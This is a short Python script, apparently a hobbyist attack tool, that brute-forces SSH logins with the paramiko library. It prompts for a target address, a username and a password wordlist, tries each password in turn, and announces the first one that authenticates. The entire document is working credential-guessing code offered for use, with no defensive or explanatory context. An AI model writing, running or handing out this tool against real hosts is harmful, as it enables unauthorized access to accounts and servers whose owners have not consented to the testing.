import paramiko, socket, os
from termcolor import colored

def ssh_connect(password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code=1
	except socket.error as e:
		code =2

	ssh.close()
	return code


if __name__ == "__main__":
	host = input("[+] Target address: ")
	username = input("[+] SSH username: ")
	input_file = input("[+] Password file: ")

	if os.path.exists(input_file) == False:
		print(f" Please provide a valid path/file")

	with open(input_file, "r") as file:
		for line in file.readlines():
			password = line.strip()
			try:
				result = ssh_connect(password)
				if result == 0:
					print(colored(f"[+] Found password, for the account {username} as: {password}",'green'))
					break
				elif result == 1:
					print(colored("[-] Invalid password.",'red'))
				elif result == 2:
					print("Unable to connect.")
			except Exception as e:
				print(e)
				pass
